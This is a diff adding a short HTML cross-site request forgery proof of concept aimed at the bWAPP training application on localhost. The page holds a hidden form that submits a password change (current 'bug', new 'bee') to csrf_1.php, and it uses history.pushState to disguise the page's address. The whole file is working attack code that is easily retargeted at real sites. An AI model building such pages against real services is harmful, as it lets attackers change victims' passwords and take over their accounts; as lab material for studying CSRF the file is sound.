@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+  <body>
+  <h1>CSRF POC</h1>
+  <script>history.pushState('', '', '/')</script>	<!--https://developer.mozilla.org/en-US/docs/Web/API/History_API for pushState()-->
+    <form action="http://localhost/bWAPP/csrf_1.php">
+      <input type="hidden" name="password&#95;curr" value="bug" />
+      <input type="hidden" name="password&#95;new" value="bee" />
+      <input type="hidden" name="password&#95;conf" value="bee" />
+      <input type="hidden" name="action" value="change" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
